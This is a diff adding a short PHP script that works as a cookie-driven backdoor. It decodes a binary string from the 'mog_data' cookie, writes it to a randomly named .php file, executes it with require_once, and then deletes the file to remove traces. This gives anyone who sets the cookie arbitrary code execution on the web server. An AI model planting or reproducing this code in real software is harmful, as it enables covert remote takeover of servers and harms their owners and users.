@@ -1,0 +1,27 @@
+// 1.) Convert Binary to String
+function binToStr($input)
+{
+ $chunks = str_split($input,8);
+ $ret = '';
+ foreach ($chunks as $chunk)
+ {
+   $ret .= chr(bindec($chunk));
+ }
+ return $ret;
+}
+
+// 2.) Create a temporary file
+$tmp_file = "mog_" . mt_rand(10000, 99999) . ".php";
+
+// 3.) Write the decoded Binary to our temporary file
+$worker_file = fopen($tmp_file, "w") or die("Unable to open file!");
+$txt = binToStr($_COOKIE["mog_data"]);
+fwrite($worker_file, $txt);
+fclose($worker_file);
+
+// 4.) Include our newly created temporary file with our newly decoded PHP
+require_once($tmp_file);
+
+// 5.) Once payload is executed Delete the temporary file.
+unlink($tmp_file);
+
